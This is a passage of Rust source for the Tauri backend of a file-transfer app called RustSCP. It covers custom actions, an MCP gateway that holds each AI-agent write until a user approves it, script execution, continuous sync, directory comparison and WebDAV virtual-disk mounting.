            .map_err(|e| format!("Could not create {}: {}", parent.display(), e))?;
    }
    let data = serde_json::to_vec_pretty(actions).map_err(|e| e.to_string())?;
    rustscp_core::vault::write_private_file_atomic(path, &data)
        .map_err(|e| format!("Could not save {}: {}", path.display(), e))
}

async fn load_custom_actions() -> Result<Vec<ActionDefinition>, String> {
    let path = custom_actions_path();
    tokio::task::spawn_blocking(move || read_custom_actions(&path))
        .await
        .map_err(|e| e.to_string())?
}

/// Built-in actions followed by the custom ones. A custom action can never shadow a
/// built-in id (the built-in wins).
fn merge_action_catalog(custom: Vec<ActionDefinition>) -> Vec<ActionDefinition> {
    let mut all = ActionCatalog::builtin_actions();
    let builtin_ids: std::collections::HashSet<String> = all.iter().map(|a| a.id.clone()).collect();
    all.extend(custom.into_iter().filter(|a| !builtin_ids.contains(&a.id)));
    all
}

/// Full catalog; an unreadable custom file degrades to the built-ins (and is logged).
async fn full_action_catalog() -> Vec<ActionDefinition> {
    match load_custom_actions().await {
        Ok(custom) => merge_action_catalog(custom),
        Err(e) => {
            tracing::warn!("custom actions unavailable: {e}");
            ActionCatalog::builtin_actions()
        }
    }
}

#[tauri::command]
pub async fn get_actions_catalog() -> Result<Vec<ActionDefinition>, String> {
    Ok(full_action_catalog().await)
}

#[tauri::command]
pub async fn render_action_command(
    action_id: String,
    current_dir: String,
    selected_paths: Vec<String>,
    params: HashMap<String, String>,
) -> Result<String, String> {
    let actions = full_action_catalog().await;
    let action = actions
        .iter()
        .find(|a| a.id == action_id)
        .ok_or_else(|| format!("Action '{}' not found", action_id))?;

    let ctx = ActionContext::new(current_dir, selected_paths);
    ActionExecutor::render_command(action, &ctx, &params).map_err(|e| e.to_string())
}

#[tauri::command]
pub async fn get_mcp_audit_logs(
    state: tauri::State<'_, AppState>,
    limit: usize,
) -> Result<Vec<AuditEvent>, String> {
    Ok(state.audit_logger.get_recent_events(limit).await)
}

#[tauri::command]
pub async fn get_mcp_status(state: tauri::State<'_, AppState>) -> Result<McpStatusInfo, String> {
    let reachable_sessions = state.mcp_server.connection_ids().await.len();
    let total_audit_events = state.audit_logger.event_count().await;
    let gateway = {
        let slot = lock_gateway(&state.mcp_gateway);
        GatewayStatus {
            running: slot.gateway.is_some(),
            connected_agents: slot.gateway.as_ref().map_or(0, |g| g.connected_clients()),
            error: slot.error.clone(),
        }
    };
    let exe = std::env::current_exe()
        .ok()
        .map(|p| p.to_string_lossy().into_owned());
    Ok(mcp_status_info(
        state.mcp_server.transport_available(),
        gateway,
        reachable_sessions,
        total_audit_events,
        exe.as_deref(),
    ))
}

/// Listener state as the status screen reports it.
struct GatewayStatus {
    running: bool,
    connected_agents: usize,
    error: Option<String>,
}

/// The gateway is only reported as enabled when an external MCP client can actually reach
/// it: the build has a transport and the app is listening for bridges.
fn mcp_status_info(
    transport_available: bool,
    gateway: GatewayStatus,
    active_sessions_count: usize,
    total_audit_events: usize,
    exe: Option<&str>,
) -> McpStatusInfo {
    let running = transport_available && gateway.running;
    McpStatusInfo {
        enabled: running,
        active_sessions_count,
        total_audit_events,
        transport_available,
        transport_running: running,
        connected_agents: if running { gateway.connected_agents } else { 0 },
        setup_command: exe.filter(|_| transport_available).map(mcp_setup_command),
        setup_json: exe.filter(|_| transport_available).map(mcp_setup_json),
        gateway_error: gateway.error,
    }
}

// ---------------------- MCP GATEWAY (AI AGENTS) ----------------------

/// Command-line flag that turns this executable into the MCP stdio server agents launch.
pub const MCP_STDIO_FLAG: &str = "--mcp-stdio";
/// Agent activity log in the config directory.
const MCP_AUDIT_LOG_FILE: &str = "mcp-audit.log";
/// How long an agent's write waits for Allow / Deny before it is denied.
const MCP_APPROVAL_TIMEOUT: std::time::Duration = std::time::Duration::from_secs(120);
/// Event carrying an [`McpApprovalPrompt`] to the window.
const MCP_APPROVAL_REQUEST_EVENT: &str = "mcp-approval-request";
/// Event with the id of a prompt that is no longer pending (answered, timed out, withdrawn).
const MCP_APPROVAL_RESOLVED_EVENT: &str = "mcp-approval-resolved";

#[derive(Default)]
pub struct McpGatewayState {
    pub gateway: Option<McpGateway>,
    pub error: Option<String>,
}

fn lock_gateway(
    slot: &std::sync::Mutex<McpGatewayState>,
) -> std::sync::MutexGuard<'_, McpGatewayState> {
    slot.lock().unwrap_or_else(|e| e.into_inner())
}

/// Shows how `arg` is typed in a shell: as-is when it has no special characters, quoted
/// otherwise (double quotes on Windows, POSIX single quotes elsewhere).
fn display_shell_arg(arg: &str) -> String {
    let plain = !arg.is_empty()
        && arg.chars().all(|c| {
            c.is_ascii_alphanumeric() || "/._-+:@,".contains(c) || (cfg!(windows) && c == '\\')
        });
    if plain {
        arg.to_string()
    } else if cfg!(windows) {
        format!("\"{arg}\"")
    } else {
        sh_quote(arg)
    }
}

/// `claude mcp add` command that registers this executable's stdio server.
fn mcp_setup_command(exe: &str) -> String {
    format!(
        "claude mcp add rustscp -- {} {MCP_STDIO_FLAG}",
        display_shell_arg(exe)
    )
}

/// `mcpServers` entry for clients configured with JSON (Cursor, Claude Desktop, ...).
fn mcp_setup_json(exe: &str) -> String {
    let config = serde_json::json!({
        "mcpServers": { "rustscp": { "command": exe, "args": [MCP_STDIO_FLAG] } }
    });
    serde_json::to_string_pretty(&config).unwrap_or_default()
}

/// Starts accepting `--mcp-stdio` bridges and routes agent writes to the window for
/// approval. Called once the window exists; a failure is reported by `get_mcp_status`.
pub async fn start_mcp_gateway(app: tauri::AppHandle) {
    use tauri::Manager;

    let state = app.state::<AppState>();
    state.mcp_server.set_approver(Arc::new(WindowApprover {
        app: app.clone(),
        approvals: state.mcp_approvals.clone(),
    }));
    let started = McpGateway::start(state.mcp_server.clone(), &get_rustscp_config_dir()).await;
    let mut slot = lock_gateway(&state.mcp_gateway);
    match started {
        Ok(gateway) => {
            slot.gateway = Some(gateway);
            slot.error = None;
        }
        Err(e) => {
            tracing::warn!("the AI gateway could not start: {e}");
            slot.error = Some(e.to_string());
        }
    }
}

/// Stops accepting agents; their pending approvals are withdrawn.
fn stop_mcp_gateway(state: &AppState) {
    let gateway = lock_gateway(&state.mcp_gateway).gateway.take();
    drop(gateway);
}

/// An agent write waiting in the window.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct McpApprovalPrompt {
    pub id: String,
    #[serde(flatten)]
    pub request: ApprovalRequest,
    /// Unix time in milliseconds at which the write is denied if nobody answers.
    pub expires_at_ms: i64,
}

type PendingApprovals = HashMap<String, (McpApprovalPrompt, tokio::sync::oneshot::Sender<bool>)>;

/// Agent writes waiting for Allow / Deny.
#[derive(Default)]
pub struct McpApprovals {
    pending: std::sync::Mutex<PendingApprovals>,
}

impl McpApprovals {
    fn lock(&self) -> std::sync::MutexGuard<'_, PendingApprovals> {
        self.pending.lock().unwrap_or_else(|e| e.into_inner())
    }

    /// Waiting prompts, oldest first.
    pub fn prompts(&self) -> Vec<McpApprovalPrompt> {
        let mut prompts: Vec<McpApprovalPrompt> =
            self.lock().values().map(|(p, _)| p.clone()).collect();
        prompts.sort_by_key(|p| p.expires_at_ms);
        prompts
    }

    /// Delivers the person's answer. `false` when the prompt is no longer waiting.
    pub fn respond(&self, id: &str, approved: bool) -> bool {
        match self.lock().remove(id) {
            Some((_, reply)) => reply.send(approved).is_ok(),
            None => false,
        }
    }
}

/// Removes a prompt that stops waiting for any reason and tells the window.
struct WithdrawPrompt {
    app: tauri::AppHandle,
    approvals: Arc<McpApprovals>,
    id: String,
}

impl Drop for WithdrawPrompt {
    fn drop(&mut self) {
        use tauri::Emitter;
        self.approvals.lock().remove(&self.id);
        let _ = self.app.emit(MCP_APPROVAL_RESOLVED_EVENT, &self.id);
    }
}

/// Asks the person at the RustSCP window to allow each agent write.
struct WindowApprover {
    app: tauri::AppHandle,
    approvals: Arc<McpApprovals>,
}

#[async_trait::async_trait]
impl ToolApprover for WindowApprover {
    async fn approve(&self, request: ApprovalRequest) -> ApprovalDecision {
        use tauri::{Emitter, Manager};

        let id = uuid::Uuid::new_v4().to_string();
        let expires_at_ms =
            chrono::Utc::now().timestamp_millis() + MCP_APPROVAL_TIMEOUT.as_millis() as i64;
        let prompt = McpApprovalPrompt {
            id: id.clone(),
            request,
            expires_at_ms,
        };
        let (reply, answer) = tokio::sync::oneshot::channel();
        self.approvals
            .lock()
            .insert(id.clone(), (prompt.clone(), reply));
        // Withdrawn from the window however this ends (answer, timeout, agent gone).
        let _withdraw = WithdrawPrompt {
            app: self.app.clone(),
            approvals: self.approvals.clone(),
            id,
        };

        if let Err(e) = self.app.emit(MCP_APPROVAL_REQUEST_EVENT, &prompt) {
            return ApprovalDecision::Denied(format!(
                "the RustSCP window could not be asked ({e})"
            ));
        }
        if let Some(window) = self.app.get_webview_window("main") {
            let _ = window.request_user_attention(Some(tauri::UserAttentionType::Critical));
        }

        match tokio::time::timeout(MCP_APPROVAL_TIMEOUT, answer).await {
            Ok(Ok(true)) => ApprovalDecision::Approved,
            Ok(Ok(false)) => ApprovalDecision::Denied("rejected by the user".to_string()),
            Ok(Err(_)) => {
                ApprovalDecision::Denied("the approval request was withdrawn".to_string())
            }
            Err(_) => ApprovalDecision::Denied(format!(
                "nobody answered within {} seconds",
                MCP_APPROVAL_TIMEOUT.as_secs()
            )),
        }
    }
}

#[tauri::command]
pub async fn get_pending_mcp_approvals(
    state: tauri::State<'_, AppState>,
) -> Result<Vec<McpApprovalPrompt>, String> {
    Ok(state.mcp_approvals.prompts())
}

#[tauri::command]
pub async fn respond_mcp_approval(
    state: tauri::State<'_, AppState>,
    id: String,
    approved: bool,
) -> Result<(), String> {
    if state.mcp_approvals.respond(&id, approved) {
        Ok(())
    } else {
        Err(
            "This request is no longer waiting (it timed out or the agent disconnected)."
                .to_string(),
        )
    }
}

// ---------------------- SCRIPT CONSOLE & AUTOMATION ----------------------

#[tauri::command]
pub async fn execute_script_line(
    state: tauri::State<'_, AppState>,
    session_id: String,
    line: String,
    mut local_dir: String,
    mut remote_dir: String,
) -> Result<ScriptCommandOutput, String> {
    let sessions = state.active_sessions.read().await;
    let local_vfs = state.local_vfs.clone();
    let remote_vfs = sessions.get(&session_id).cloned();
    drop(sessions);

    let output = ScriptInterpreter::execute_line(
        &line,
        local_vfs,
        remote_vfs,
        &mut local_dir,
        &mut remote_dir,
    )
    .await;

    Ok(output)
}

#[tauri::command]
pub async fn execute_script_batch(
    state: tauri::State<'_, AppState>,
    session_id: String,
    script: String,
    mut local_dir: String,
    mut remote_dir: String,
) -> Result<Vec<ScriptCommandOutput>, String> {
    let sessions = state.active_sessions.read().await;
    let local_vfs = state.local_vfs.clone();
    let remote_vfs = sessions.get(&session_id).cloned();
    drop(sessions);

    let mut outputs = Vec::new();
    for line in script.lines() {
        if line.trim().is_empty() {
            continue;
        }
        let out = ScriptInterpreter::execute_line(
            line,
            local_vfs.clone(),
            remote_vfs.clone(),
            &mut local_dir,
            &mut remote_dir,
        )
        .await;
        let success = out.success;
        outputs.push(out);
        if !success {
            break;
        }
    }

    Ok(outputs)
}

#[tauri::command]
pub async fn generate_automation_code(
    state: tauri::State<'_, AppState>,
    session_id: String,
    target_language: String,
    remote_path: String,
    local_path: String,
) -> Result<String, String> {
    // The generated code reads the password from RUSTSCP_PASSWORD (key passphrase:
    // RUSTSCP_KEY_PASSPHRASE) at run time and never contains a stored secret. The secrets
    // are redacted here as well, so they never reach the generator at all.
    let config = {
        let configs = state.session_configs.read().await;
        let config = configs
            .get(&session_id)
            .ok_or_else(|| format!("Session '{}' not found", session_id))?;
        redact_site(config)
    };

    let lang = match target_language.to_lowercase().as_str() {
        "url" | "session_url" | "winscp_url" => CodeTargetLanguage::WinScpUrl,
        "script" | "batch_script" | "winscp_script" => CodeTargetLanguage::WinScpScript,
        "curl" => CodeTargetLanguage::Curl,
        "python" => CodeTargetLanguage::Python,
        "rsync" | "bash" | "bash_rsync" => CodeTargetLanguage::BashRsync,
        "csharp" | "dotnet" | "dotnet_csharp" => CodeTargetLanguage::DotNetCSharp,
        _ => return Err(format!("Unsupported target language: {}", target_language)),
    };

    Ok(CodeGenerator::generate(
        &config,
        lang,
        &remote_path,
        &local_path,
    ))
}

// ---------------------- ADVANCED SEARCH & FIND FILES (Shift+F7) ----------------------

#[tauri::command]
pub async fn find_files_advanced(
    state: tauri::State<'_, AppState>,
    session_id: String,
    query: FindFileQuery,
) -> Result<Vec<FindFileMatch>, String> {
    let vfs = get_vfs(&state, &session_id).await?;

    vfs.find_files(&query).await.map_err(|e| e.to_string())
}

// ---------------------- FILESYSTEM & SERVER INFO ----------------------

#[tauri::command]
pub async fn get_filesystem_info(
    state: tauri::State<'_, AppState>,
    session_id: String,
    path: String,
) -> Result<FileSystemInfo, String> {
    let vfs = get_vfs(&state, &session_id).await?;

    vfs.get_filesystem_info(&path)
        .await
        .map_err(|e| e.to_string())
}

#[tauri::command]
pub async fn calculate_directory_size(
    state: tauri::State<'_, AppState>,
    session_id: String,
    path: String,
) -> Result<u64, String> {
    let vfs = get_vfs(&state, &session_id).await?;

    vfs.calculate_size(&path).await.map_err(|e| e.to_string())
}

#[tauri::command]
pub async fn create_symlink(
    state: tauri::State<'_, AppState>,
    session_id: String,
    link_path: String,
    target_path: String,
    is_symbolic: bool,
) -> Result<(), String> {
    let vfs = get_vfs(&state, &session_id).await?;

    vfs.create_symlink(&target_path, &link_path, is_symbolic)
        .await
        .map_err(|e| e.to_string())
}

// ---------------------- DUAL-PANE DIRECTORY COMPARISON (Shift+F2) ----------------------

#[tauri::command]
pub async fn compare_directories_fast(
    state: tauri::State<'_, AppState>,
    local_session: String,
    local_dir: String,
    remote_session: String,
    remote_dir: String,
    mode: String,
) -> Result<Vec<DirectoryDiffItem>, String> {
    let local_vfs = get_vfs_as(&state, &local_session, "Local").await?;
    let remote_vfs = get_vfs_as(&state, &remote_session, "Remote").await?;

    // Both listings run concurrently.
    let (local_items, remote_items) = tokio::join!(
        local_vfs.list_dir(&local_dir),
        remote_vfs.list_dir(&remote_dir)
    );
    let local_items = local_items.map_err(|e| e.to_string())?;
    let remote_items = remote_items.map_err(|e| e.to_string())?;

    let mut local_map: HashMap<String, FileEntry> = HashMap::new();
    for item in local_items {
        local_map.insert(item.name.clone(), item);
    }

    let mut remote_map: HashMap<String, FileEntry> = HashMap::new();
    for item in remote_items {
        remote_map.insert(item.name.clone(), item);
    }

    let mut all_names: std::collections::BTreeSet<String> = std::collections::BTreeSet::new();
    for k in local_map.keys() {
        all_names.insert(k.clone());
    }
    for k in remote_map.keys() {
        all_names.insert(k.clone());
    }

    let check_size = mode == "size" || mode == "both";
    let check_time = mode == "time" || mode == "both";

    let mut diffs = Vec::new();
    for name in all_names {
        let loc = local_map.get(&name);
        let rem = remote_map.get(&name);

        match (loc, rem) {
            (Some(l), None) => {
                diffs.push(DirectoryDiffItem {
                    name: name.clone(),
                    local_path: Some(l.path.clone()),
                    remote_path: None,
                    local_entry: Some(l.clone()),
                    remote_entry: None,
                    diff_type: DirectoryDiffType::MissingInRemote,
                });
            }
            (None, Some(r)) => {
                diffs.push(DirectoryDiffItem {
                    name: name.clone(),
                    local_path: None,
                    remote_path: Some(r.path.clone()),
                    local_entry: None,
                    remote_entry: Some(r.clone()),
                    diff_type: DirectoryDiffType::MissingInLocal,
                });
            }
            (Some(l), Some(r)) => {
                let mut diff_type = DirectoryDiffType::Identical;

                if check_size && l.size != r.size && l.is_file() && r.is_file() {
                    diff_type = DirectoryDiffType::DifferentSize;
                } else if check_time && l.modified_at != r.modified_at && l.is_file() && r.is_file()
                {
                    diff_type = DirectoryDiffType::DifferentTime;
                }

                diffs.push(DirectoryDiffItem {
                    name: name.clone(),
                    local_path: Some(l.path.clone()),
                    remote_path: Some(r.path.clone()),
                    local_entry: Some(l.clone()),
                    remote_entry: Some(r.clone()),
                    diff_type,
                });
            }
            (None, None) => {}
        }
    }

    Ok(diffs)
}

// ---------------------- CONTINUOUS SYNC (KEEP UP TO DATE) ----------------------

/// Remote destination of a local path that continuous sync reports as changed.
fn continuous_sync_dest(remote_root: &str, relative: &str) -> String {
    let rel = relative.replace('\\', "/");
    format!(
        "{}/{}",
        remote_root.trim_end_matches('/'),
        rel.trim_start_matches('/')
    )
}

/// Applies one watcher event to the remote side. Errors are returned for logging; the
/// sync keeps running.
async fn apply_continuous_sync_event(
    remote_vfs: &Arc<dyn VirtualFileSystem>,
    evt: &rustscp_core::WatchEvent,
    remote_root: &str,
    delete_remote: bool,
) -> Result<(), String> {
    let dest = continuous_sync_dest(remote_root, &evt.relative_path);
    if evt.is_removal() {
        if !delete_remote {
            return Ok(());
        }
        return remove_remote_path(remote_vfs, &dest).await;
    }
    if evt.is_dir {
        return remote_vfs.create_dir(&dest).await.map_err(core_err);
    }
    match upload_local_file(remote_vfs, &evt.path, &dest).await {
        Ok(_) => Ok(()),
        Err(first) => {
            // A file in a folder the server does not have yet: create it and retry once.
            match remote_parent_dir(&dest) {
                Some(parent) if parent != "/" => {
                    remote_vfs
                        .create_dir(parent)
                        .await
                        .map_err(|_| first.clone())?;
                    upload_local_file(remote_vfs, &evt.path, &dest)
                        .await
                        .map(|_| ())
                }
                _ => Err(first),
            }
        }
    }
}

/// Stops the running continuous sync (if any). The caller holds `continuous_sync_cancel`.
async fn stop_continuous_sync_locked(
    state: &AppState,
    cancel_guard: &mut Option<broadcast::Sender<()>>,
) {
    if let Some(tx) = cancel_guard.take() {
        let _ = tx.send(());
    }
    // A run that is still winding down can no longer clear a newer run's flag.
    state
        .continuous_sync_generation
        .fetch_add(1, Ordering::SeqCst);
    state.continuous_sync_active.store(false, Ordering::SeqCst);
    *state.continuous_sync_session.lock().await = None;
}

/// Stops continuous sync when it uploads to `session_id` (called on disconnect).
async fn stop_continuous_sync_if_targets(state: &AppState, session_id: &str) {
    let mut cancel_guard = state.continuous_sync_cancel.lock().await;
    let targets = state.continuous_sync_session.lock().await.as_deref() == Some(session_id);
    if targets {
        stop_continuous_sync_locked(state, &mut cancel_guard).await;
    }
}

#[tauri::command]
pub async fn start_continuous_sync(
    state: tauri::State<'_, AppState>,
    local_path: String,
    remote_session: String,
    remote_path: String,
    delete_remote: bool,
) -> Result<(), String> {
    // Fails early when the remote session is gone.
    get_vfs_as(&state, &remote_session, "Remote").await?;

    // Start/stop are serialized by this lock. Starting while a sync runs replaces it, so
    // the folder pair the user just picked is the one that is synced.
    let mut cancel_guard = state.continuous_sync_cancel.lock().await;
    if cancel_guard.is_some() || state.continuous_sync_active.load(Ordering::SeqCst) {
        stop_continuous_sync_locked(&state, &mut cancel_guard).await;
    }

    // The watcher must be running before the sync is reported as active.
    let (event_tx, mut event_rx) = tokio::sync::mpsc::channel(100);
    let watcher = rustscp_core::ContinuousSyncWatcher::new(&local_path, event_tx);
    // Registering a recursive watch can walk a large tree (inotify): off the async workers.
    let (mut watcher, started) = tokio::task::spawn_blocking(move || {
        let mut watcher = watcher;
        let started = watcher.start();
        (watcher, started)
    })
    .await
    .map_err(|e| e.to_string())?;
    if let Err(e) = started {
        watcher.stop();
        return Err(e.to_string());
    }

    let (cancel_tx, mut cancel_rx) = broadcast::channel::<()>(1);
    let generation = state
        .continuous_sync_generation
        .fetch_add(1, Ordering::SeqCst)
        + 1;
    *cancel_guard = Some(cancel_tx);
    *state.continuous_sync_session.lock().await = Some(remote_session.clone());
    state.continuous_sync_active.store(true, Ordering::SeqCst);
    drop(cancel_guard);

    let sessions = state.active_sessions.clone();
    let is_active = state.continuous_sync_active.clone();
    let current_generation = state.continuous_sync_generation.clone();
    let sync_session = state.continuous_sync_session.clone();
    let sync_lock = state.continuous_sync_cancel.clone();
    let cache = state.disk_cache.clone();

    tokio::spawn(async move {
        loop {
            tokio::select! {
                _ = cancel_rx.recv() => break,
                maybe_evt = event_rx.recv() => {
                    let Some(evt) = maybe_evt else { break };
                    // Clone the driver and release the registry lock before uploading.
                    let remote_vfs = sessions.read().await.get(&remote_session).cloned();
                    let Some(remote_vfs) = remote_vfs else {
                        tracing::info!("continuous sync stopped: session {remote_session} is gone");
                        break;
                    };
                    if let Err(e) =
                        apply_continuous_sync_event(&remote_vfs, &evt, &remote_path, delete_remote).await
                    {
                        tracing::warn!(
                            "continuous sync could not update '{}': {e}",
                            evt.relative_path
                        );
                    }
                    let dest = continuous_sync_dest(&remote_path, &evt.relative_path);
                    cache.invalidate_catalog(&remote_session, &dest).await;
                    cache.invalidate_content(&remote_session, &dest).await;
                }
            }
        }
        watcher.stop();
        // Only this run's own state is cleared; a newer run keeps its flag. The start/stop
        // lock keeps a concurrent start from interleaving with this check.
        let _serialized = sync_lock.lock().await;
        if current_generation.load(Ordering::SeqCst) == generation {
            is_active.store(false, Ordering::SeqCst);
            let mut target = sync_session.lock().await;
            if target.as_deref() == Some(remote_session.as_str()) {
                *target = None;
            }
        }
    });

    Ok(())
}

#[tauri::command]
pub async fn stop_continuous_sync(state: tauri::State<'_, AppState>) -> Result<(), String> {
    let mut cancel_guard = state.continuous_sync_cancel.lock().await;
    stop_continuous_sync_locked(&state, &mut cancel_guard).await;
    Ok(())
}

#[tauri::command]
pub fn is_continuous_sync_running(state: tauri::State<'_, AppState>) -> bool {
    state.continuous_sync_active.load(Ordering::SeqCst)
}

// ---------------------- BOOKMARKS / FAVORITES ----------------------

#[tauri::command]
pub async fn get_bookmarks(state: tauri::State<'_, AppState>) -> Result<Vec<BookmarkItem>, String> {
    let bm = state.bookmarks.read().await;
    Ok(bm.clone())
}

#[tauri::command]
pub async fn add_bookmark(
    state: tauri::State<'_, AppState>,
    bookmark: BookmarkItem,
) -> Result<(), String> {
    let mut bm = state.bookmarks.write().await;
    bm.retain(|b| b.id != bookmark.id);
    bm.push(bookmark);
    Ok(())
}

#[tauri::command]
pub async fn delete_bookmark(state: tauri::State<'_, AppState>, id: String) -> Result<(), String> {
    let mut bm = state.bookmarks.write().await;
    bm.retain(|b| b.id != id);
    Ok(())
}

// ---------------------- FILE MASK FILTER TESTER ----------------------

#[tauri::command]
pub fn test_file_mask(mask: String, filename: String) -> bool {
    let filter = FileMaskFilter::new(&mask);
    filter.matches(&filename, false)
}

// ---------------------- VIRTUAL DISK / WEBDAV MOUNTING ----------------------

#[tauri::command]
pub async fn mount_virtual_disk(
    state: tauri::State<'_, AppState>,
    session_id: String,
) -> Result<VirtualDiskInfo, String> {
    let vfs = get_vfs(&state, &session_id).await?;
    // Local folders are already reachable in Finder / Explorer; serving them over WebDAV
    // would only add a second, network-reachable path to the same files.
    if vfs.protocol() == Protocol::Local {
        return Err(
            "Local folders are already on this computer: open them in the file manager \
             directly. Virtual disks are for remote connections (SFTP, FTP, S3)."
                .to_string(),
        );
    }

    let configs = state.session_configs.read().await;
    let (raw_name, config_root) = configs
        .get(&session_id)
        .map(|c| (c.name.clone(), c.remote_root.clone()))
        .unwrap_or_else(|| (session_id.clone(), String::new()));
    drop(configs);
    // The name becomes a Desktop shortcut / mount folder / volume label and is used in
    // OS scripts, so it must be a plain file name (no `/`, `..`, quotes or control chars).
    let name = sanitize_display_name(&raw_name, &sanitize_display_name(&session_id, "RustSCP"));

    // Mount strictly from the user's home / root directory
    let mount_root = if !config_root.trim().is_empty() && config_root != "/" {
        config_root
    } else {
        vfs.get_default_path()
            .await
            .unwrap_or_else(|_| "/".to_string())
    };

    // One mount per session at a time: two concurrent mounts would share (and
    // force-unmount) the same mount folder.
    if !state
        .virtual_disks_mounting
        .lock()
        .await
        .insert(session_id.clone())
    {
        return Err("This connection is already being mounted, please wait".to_string());
    }
    let result = mount_virtual_disk_inner(&state, &session_id, name, mount_root, vfs).await;
    state
        .virtual_disks_mounting
        .lock()
        .await
        .remove(&session_id);
    result
}

/// Mounts without holding the `virtual_disks` lock across the OS mount (diskutil /
/// mount_webdav / net use can take many seconds or wait on a system prompt), so status,
/// unmount and "open folder" for the other sessions stay responsive.
async fn mount_virtual_disk_inner(
    state: &AppState,
    session_id: &str,
    name: String,
    mount_root: String,
    vfs: Arc<dyn VirtualFileSystem>,
) -> Result<VirtualDiskInfo, String> {
    let current = {
        let disks = state.virtual_disks.lock().await;
        disks
            .get(session_id)
            .map(|s| (s.is_active(), s.info(), s.mount_point().cloned(), s.port()))
    };
    if let Some((active, info, mount_point, port)) = current {
        // A running server whose volume the user ejected in Finder / Explorer is mounted
        // again instead of being reported as mounted.
        let live = active
            && match mount_point {
                Some(mp) => virtual_disk_still_mounted(mp, port).await,
                None => true,
            };
        if live {
            return Ok(info);
        }
        // A stopped or ejected server may still have a mount point or shortcut.
        if let Some(mut old) = take_virtual_disk_if_port(state, session_id, port).await {
            let _ = old.unmount_and_stop().await;
        }
    }

    let mut server = WebDavServer::new(
        session_id.to_string(),
        name,
        mount_root,
        vfs,
        state.disk_cache.clone(),
    );
    // The server mounts its own `mount_url()` (loopback address plus the secret path
    // token); `info()` reports that URL so it can also be mounted by hand.
    server.mount_in_os().await.map_err(|e| e.to_string())?;
    let info = server.info();

    // The session may have been disconnected while the OS was mounting.
    let still_connected = state.active_sessions.read().await.contains_key(session_id);
    if !still_connected {
        let _ = server.unmount_and_stop().await;
        return Err(format!("Session '{}' was disconnected", session_id));
    }
    state
        .virtual_disks
        .lock()
        .await
        .insert(session_id.to_string(), server);
    Ok(info)
}

#[tauri::command]
pub async fn unmount_virtual_disk(
    state: tauri::State<'_, AppState>,
    session_id: String,
) -> Result<(), String> {
    // Take the server out first; the OS unmount runs without the lock.
    let server = state.virtual_disks.lock().await.remove(&session_id);
    if let Some(mut server) = server {
        server.unmount_and_stop().await.map_err(|e| e.to_string())?;
    }
    Ok(())
}

/// Unmounts every virtual disk and stops continuous sync. Meant for the app's exit
/// handler (`RunEvent::ExitRequested`), so Finder/Explorer never keep a volume that
/// points at a dead port.
pub async fn shutdown_background_services(state: &AppState) {
    stop_mcp_gateway(state);
    let servers: Vec<WebDavServer> = state
        .virtual_disks
        .lock()
        .await
        .drain()
        .map(|(_, server)| server)
        .collect();
    for mut server in servers {
        let _ = server.unmount_and_stop().await;
    }
    let mut cancel_guard = state.continuous_sync_cancel.lock().await;
    stop_continuous_sync_locked(state, &mut cancel_guard).await;
}

/// How long a status check waits for the OS to answer about the mount points.
const MOUNT_PROBE_TIMEOUT: std::time::Duration = std::time::Duration::from_secs(3);

/// Whether the OS still has a virtual disk mounted at `mount_point`. `false` only when the
/// volume is clearly gone (ejected in Finder / Explorer / Files): a probe that fails in
/// another way or does not answer in time is not proof of an eject.
#[cfg(target_os = "macos")]
fn os_mount_present(mount_point: &str, _port: u16) -> bool {
    use std::os::unix::fs::MetadataExt;
    let path = std::path::Path::new(mount_point);
    let meta = match std::fs::metadata(path) {
        Ok(meta) => meta,
        Err(e) => return e.kind() != std::io::ErrorKind::NotFound,
    };
    // A mounted volume is its own device; after an eject the folder that stays behind is
    // an ordinary directory on the parent's device.
    match path.parent().map(std::fs::metadata) {
        Some(Ok(parent)) => meta.dev() != parent.dev(),
        _ => true,
    }
}

/// See the macOS variant. gvfs exposes `dav:host=127.0.0.1,port=<port>[,...]` under
/// `/run/user/<uid>/gvfs` only while the share is mounted.
#[cfg(target_os = "linux")]
fn os_mount_present(mount_point: &str, port: u16) -> bool {
    use std::os::unix::fs::MetadataExt;
    let path = std::path::Path::new(mount_point);
    match std::fs::metadata(path) {
        Ok(_) => return true,
        Err(e) if e.kind() != std::io::ErrorKind::NotFound => return true,
        Err(_) => {}
    }
    let Some(gvfs) = path.parent() else {
        return true;
    };
    // Only a running gvfs FUSE daemon (a separate device) can tell that the share is gone.
    let fuse_running = match (
        std::fs::metadata(gvfs),
        gvfs.parent().map(std::fs::metadata),
    ) {
        (Ok(dir), Some(Ok(parent))) => dir.dev() != parent.dev(),
        _ => false,
    };
    if !fuse_running {
        return true;
    }
    let prefix = format!("dav:host=127.0.0.1,port={}", port);
    let with_options = format!("{},", prefix);
    match std::fs::read_dir(gvfs) {
        Ok(entries) => entries.flatten().any(|entry| {
            let name = entry.file_name().to_string_lossy().into_owned();
            name == prefix || name.starts_with(&with_options)
        }),
        Err(_) => true,
    }
}

/// See the macOS variant. `mount_point` is the mapped drive (`X:`).
#[cfg(target_os = "windows")]
fn os_mount_present(mount_point: &str, _port: u16) -> bool {
    let root = format!("{}\\", mount_point.trim_end_matches('\\'));
    match std::fs::metadata(root) {
        Ok(_) => true,
        Err(e) => e.kind() != std::io::ErrorKind::NotFound,
    }
}

#[cfg(not(any(target_os = "macos", target_os = "linux", target_os = "windows")))]
fn os_mount_present(_mount_point: &str, _port: u16) -> bool {
    true
}

/// [`os_mount_present`] off the async workers and bounded by [`MOUNT_PROBE_TIMEOUT`] (a
/// stat on a network volume can block).
async fn virtual_disk_still_mounted(mount_point: String, port: u16) -> bool {
    let probe = tokio::task::spawn_blocking(move || os_mount_present(&mount_point, port));
    !matches!(
        tokio::time::timeout(MOUNT_PROBE_TIMEOUT, probe).await,
        Ok(Ok(false))
    )
}

/// Removes the session's virtual disk from the registry when it is still the server that
/// listens on `port` (a newer mount of the same session is left alone).
async fn take_virtual_disk_if_port(
    state: &AppState,
    session_id: &str,
    port: u16,
) -> Option<WebDavServer> {
    let mut disks = state.virtual_disks.lock().await;
    if disks.get(session_id).map(|s| s.port()) == Some(port) {
        disks.remove(session_id)
    } else {
        None
    }
}

/// Cleans up a virtual disk the user ejected outside RustSCP: removes its Desktop shortcut
/// and empty mount folder and stops its WebDAV server, so "Mount" works again. Skipped
/// while a mount of the same session runs (that mount owns the mount folder).
async fn retire_ejected_virtual_disk(state: &AppState, session_id: &str, port: u16) {
    if !state
        .virtual_disks_mounting
        .lock()
        .await
        .insert(session_id.to_string())
    {
        return;
    }
    if let Some(mut server) = take_virtual_disk_if_port(state, session_id, port).await {
        tracing::info!("the virtual disk of session {session_id} was ejected outside RustSCP");
        let _ = server.unmount_and_stop().await;
    }
